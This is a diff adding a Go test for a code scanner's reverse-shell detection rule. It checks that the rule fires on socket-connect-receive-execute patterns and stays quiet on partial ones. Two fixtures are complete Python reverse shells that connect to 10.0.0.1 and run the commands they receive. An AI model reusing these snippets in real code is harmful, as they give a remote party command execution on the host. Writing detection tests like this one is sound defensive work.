@@ -414,3 +414,62 @@ pickle.dump({"a": 1}, open("p.pkl", "wb"))
 		})
 	}
 }
+
+// TestReverseShell pins the combination rule: a socket constructor, a connect
+// call, a receive call and a command sink in one artifact. The payload text a
+// generator embeds in a string literal counts, because that is where the published
+// generators put it.
+func TestReverseShell(t *testing.T) {
+	cases := []struct {
+		name string
+		src  string
+		want bool
+	}{
+		{"payload in a string literal", `import textwrap
+
+payload = textwrap.dedent("""
+def rev_shell():
+    import socket, subprocess
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("10.0.0.1", 8080))
+    cmd = s.recv(1024).decode()
+    out = subprocess.getoutput(cmd)
+    s.sendall(out.encode())
+""").strip()
+`, true},
+		{"live code", `import socket, os
+
+s = socket.socket()
+s.connect(("10.0.0.1", 4444))
+cmd = s.recv(4096)
+os.system(cmd)
+`, true},
+		{"socket and command sink but no connect or recv", `import socket, subprocess
+
+s = socket.socket()
+subprocess.run(["id"])
+`, false},
+		{"only a socket constructor", `import socket
+
+s = socket.socket()
+`, false},
+		{"server that echoes without a command sink", `import socket
+
+s = socket.socket()
+s.bind(("0.0.0.0", 9000))
+s.listen(1)
+conn, addr = s.accept()
+data = conn.recv(1024)
+conn.sendall(data)
+`, false},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			got := analyzeOK(t, c.src)
+			if got["SC4N-CODE-REVERSE-SHELL"] != c.want {
+				t.Fatalf("SC4N-CODE-REVERSE-SHELL = %v, want %v (findings %v)",
+					got["SC4N-CODE-REVERSE-SHELL"], c.want, keys(got))
+			}
+		})
+	}
+}
